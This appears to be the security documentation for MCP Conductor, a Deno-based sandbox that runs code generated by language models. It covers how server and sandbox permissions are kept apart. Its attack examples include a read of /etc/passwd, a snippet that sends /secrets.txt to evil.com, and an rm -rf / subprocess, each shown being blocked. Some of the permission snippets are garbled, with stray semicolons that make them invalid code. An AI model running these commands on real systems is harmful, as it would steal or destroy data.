# Security Best Practices

## How MCP Conductor Uses Deno's Security Model

MCP Conductor leverages
[Deno's security-by-default model](https://docs.deno.com/runtime/fundamentals/security/) to provide
robust sandboxing for code execution.

### Two-Layer Security Architecture

**Critical Distinction**: MCP Conductor uses **two separate processes with different permission
levels**:

#### 1. MCP Server Process (Privileged)

```json
// .cursor/mcp.json - Server permissions
{
  "command": "deno",
  "args": [
    "--allow-read", // Server can manage workspace
    "--allow-write", // Server can create files
    "--allow-net", // Server can install dependencies
    "--allow-env", // Server can read config
    "--allow-run=deno" // Server can spawn subprocesses
  ]
}
```

**Purpose**: Manage infrastructure (workspace, deps, spawning subprocesses)\
**Risk Level**: Trusted code only\
**Access**: Controlled by deployment configuration

#### 2. User Code Subprocess (Sandboxed)

```typescript
// spawned via Deno.Command with ONLY requested permissions
const cmd = new Deno.Command('deno', {
  args: [
    'run',
    '--no-prompt',
    ...permissionFlags, // ← ONLY what user explicitly requested
  ],
})
```

**Purpose**: Execute untrusted LLM-generated code\
**Risk Level**: Potentially hostile\
**Access**: Zero by default, explicit grants only

**Example**:

```typescript
// User requests:
{
  permissions: {
    net: ;
    ;['api.github.com']
  }
} // Subprocess gets ONLY:

;['--no-prompt', '--allow-net=api.github.com']

// NOT the server's --allow-write, --allow-env, etc.
```

### Core Security Principles

From Deno's documentation:

> **No access to I/O by default**: Code executing in a Deno runtime has no access to read or write
> arbitrary files on the file system, to make network requests or open network listeners, to access
> environment variables, or to spawn subprocesses.

MCP Conductor enforces this through:

1. **Process Isolation**: Server and user code run in separate Deno processes
2. **Permission Separation**: Server permissions ≠ User code permissions
3. **Explicit Grants**: All user code permissions must be explicitly requested
4. **No Permission Escalation**: The `--no-prompt` flag prevents interactive permission requests
5. **Two-Step Dependency Model**: Dependencies installed with controlled permissions, executed with
   read-only access

### Permission Granularity

Deno provides fine-grained control over what code can access:

| Permission Flag          | Purpose                               | Example Usage                     |
| ------------------------ | ------------------------------------- | --------------------------------- |
| `--allow-read=<paths>`   | Read specific files/directories       | `--allow-read=/workspace`         |
| `--allow-write=<paths>`  | Write to specific locations           | `--allow-write=/workspace/output` |
| `--allow-net=<hosts>`    | Network access to specific domains    | `--allow-net=api.github.com`      |
| `--allow-env=<vars>`     | Access specific environment variables | `--allow-env=API_KEY`             |
| `--allow-run=<commands>` | Run specific subprocesses             | `--allow-run=git`                 |
| `--allow-ffi`            | Load dynamic libraries                | Generally **not needed**          |
| `--allow-hrtime`         | High-resolution time                  | Rarely needed                     |
| `--allow-all`            | ⚠️ **DANGEROUS** - All permissions    | **Never use in production**       |

### Real-World Examples

#### ✅ **Secure: API Call with Minimal Permissions**

```typescript
await conductor.execute(
  convId,
  `
  const response = await fetch('https://api.github.com/repos/denoland/deno')
  const data = await response.json()
  data.stargazers_count
`,
  {
    permissions: {
      net: ['api.github.com'], // ONLY GitHub API, nothing else
    },
  },
)
```

#### ✅ **Secure: File Processing with Workspace Isolation**

```typescript
await conductor.execute(
  convId,
  `
  const data = await Deno.readTextFile('/workspace/input.csv')
  const processed = data.split('\\n').map(line => line.toUpperCase())
  await Deno.writeTextFile('/workspace/output.csv', processed.join('\\n'))
  processed.length
`,
  {
    permissions: {
      read: ['/workspace/input.csv'], // ONLY this input file
      write: ['/workspace/output.csv'], // ONLY this output file
    },
  },
)
```

#### ❌ **Insecure: Overly Broad Permissions**

```typescript
// DON'T DO THIS
await conductor.execute(convId, code, {
  permissions: {
    read: true, // ❌ Can read ENTIRE filesystem
    write: true, // ❌ Can write ANYWHERE
    net: true, // ❌ Can access ANY network
  },
})
```

#### ❌ **Dangerous: All Permissions**

```typescript
// NEVER DO THIS IN PRODUCTION
await conductor.execute(convId, userCode, {
  permissions: { all: true }, // ❌❌❌ Complete system access
})
```

### Dependencies and Security

#### Two-Step Security Model

Following [mcp-run-python's approach](https://github.com/pydantic/mcp-run-python):

```typescript
// Step 1: Install dependencies (isolated with write access)
// Happens in temp directory with controlled permissions
dependencies: ;
;['npm:axios@1.6.0', 'jsr:@std/path']

// Step 2: Execute code (read-only access to dependencies)
// User code CANNOT modify cached dependencies
// Prevents dependency poisoning attacks
```

#### Dependency Specification Best Practices

```typescript
// ✅ GOOD: Pinned versions
dependencies: ;
;[
  'npm:axios@1.6.0', // Specific version
  'jsr:@std/path@^1.0.0', // Caret range for std lib
]

// ⚠️ RISKY: Unpinned versions
dependencies: ;
;[
  'npm:axios', // Gets latest (could change)
  'npm:some-package@*', // Wildcard (very dangerous)
]

// ✅ GOOD: Minimal dependencies
dependencies: ;
;['jsr:@std/path'] // Only what's needed

// ❌ BAD: Unnecessary dependencies
dependencies: ;
;[
  'npm:lodash',
  'npm:moment',
  'npm:request',
  // ... 20 more packages
]
```

### Protection Against Common Attacks

#### 1. **Path Traversal** ✅ Protected

```typescript
// Attacker tries:
const code = `await Deno.readTextFile('../../../../etc/passwd')`

// With proper permissions:
permissions: {
  read: ;
  ;['/workspace']
}

// Result: PermissionDenied error
// Cannot escape workspace boundary
```

#### 2. **Network Exfiltration** ✅ Protected

```typescript
// Attacker tries to exfiltrate data:
const code = `
  const secrets = await Deno.readTextFile('/secrets.txt')
  await fetch('https://evil.com', { 
    method: 'POST', 
    body: secrets 
  })
`

// With proper permissions:
permissions: { 
  read: ['/workspace'],
  net: ['api.github.com']  // NOT evil.com
}

// Result: PermissionDenied on fetch to evil.com
```

#### 3. **Subprocess Injection** ✅ Protected

```typescript
// Attacker tries:
const code = `
  const p = Deno.run({ cmd: ['rm', '-rf', '/'] })
  await p.status()
`

// With no run permission:
permissions: {}

// Result: PermissionDenied - cannot spawn subprocess
```

#### 4. **Dependency Poisoning** ✅ Protected

```typescript
// Two-step model prevents:
// 1. User code modifying cached dependencies
// 2. Code running during install phase
// 3. Install-time attacks

// Step 1: Install (controlled environment)
await installDependencies(['npm:safe-package'])

// Step 2: Execute (read-only to dependencies)
await executeCode(userCode, {
  // No write access to node_modules/
  permissions: { read: ['/workspace'] },
})
```

### Deno Security Features We Leverage

From [Deno's security docs](https://docs.deno.com/runtime/fundamentals/security/):

1. **No Implicit Permissions**: Unlike Node.js, Deno denies everything by default
2. **Granular Permission Model**: Can restrict to specific files, not just directories
3. **No Permission Escalation**: `--no-prompt` prevents code from requesting more permissions
4. **V8 Isolation**: Each subprocess runs in isolated V8 context
5. **Frozen Imports**: Can use `--frozen` lockfile to prevent supply chain attacks

### Production Deployment Checklist

Before deploying code execution in production:

- [ ] **Never use `all: true`** - Always specify exact permissions needed
- [ ] **Whitelist specific paths** - Never `read: true` or `write: true`
- [ ] **Whitelist specific domains** - Never `net: true`
- [ ] **Pin dependency versions** - Use exact versions or tight ranges
- [ ] **Set appropriate timeouts** - Default 30s, adjust based on workload
- [ ] **Enable audit logging** - Log all executions and permission grants
- [ ] **Validate user input** - Check for suspicious patterns before execution
- [ ] **Use workspace isolation** - Create isolated directories per user/session
- [ ] **Monitor resource usage** - Track CPU, memory, execution time
- [ ] **Implement rate limiting** - Prevent abuse and DoS attacks
- [ ] **Review dependencies** - Audit all dependencies before allowing
- [ ] **Test permission failures** - Ensure graceful degradation
- [ ] **Document permission requirements** - Clear docs for users
- [ ] **Regular security audits** - Review logs and permissions regularly

### Edge Cases and Error Handling

Our implementation handles:

1. **Timeout Errors** - Prevents infinite loops (default 30s, max 5min)
2. **Permission Errors** - Clear messages about what's needed
3. **Syntax Errors** - Caught before execution
4. **Runtime Errors** - Captured with stack traces
5. **Network Errors** - Timeout, DNS failures, connection refused
6. **File System Errors** - Not found, permission denied, disk full
7. **Dependency Errors** - Install failures, version conflicts
8. **Memory Errors** - Out of memory protection
9. **Module Import Errors** - Invalid imports, circular dependencies

### Comparison with mcp-run-python

| Feature               | mcp-run-python (Pyodide)   | MCP Conductor (Deno)         |
| --------------------- | -------------------------- | ---------------------------- |
| **Runtime**           | Python in WebAssembly      | TypeScript/JavaScript native |
| **Isolation**         | WASM sandbox               | Deno subprocess + V8         |
| **Permissions**       | Implicit (WASM boundaries) | Explicit (Deno flags)        |
| **Dependencies**      | PyPI via micropip          | NPM/JSR via import maps      |
| **Performance**       | Slower (WASM overhead)     | Faster (native V8)           |
| **Security**          | Good (WASM sandbox)        | Excellent (Deno model)       |
| **Filesystem Access** | Virtual filesystem         | Real filesystem (controlled) |
| **Network Access**    | Via WASM limitations       | Explicit allow-net           |

### Resources

- [Deno Security Documentation](https://docs.deno.com/runtime/fundamentals/security/)
- [Deno Permissions Guide](https://docs.deno.com/runtime/fundamentals/security/#permissions)
- [mcp-run-python Security Model](https://github.com/pydantic/mcp-run-python)
- [Executing Untrusted Code in Deno](https://docs.deno.com/runtime/fundamentals/security/#executing-untrusted-code)

### Reporting Security Issues

Found a security vulnerability? Please email **security@conductor.dev** (do not file public issues).

We follow responsible disclosure:

1. Acknowledge within 48 hours
2. Provide fix timeline within 7 days
3. Credit researchers in advisories
4. Coordinate disclosure timing
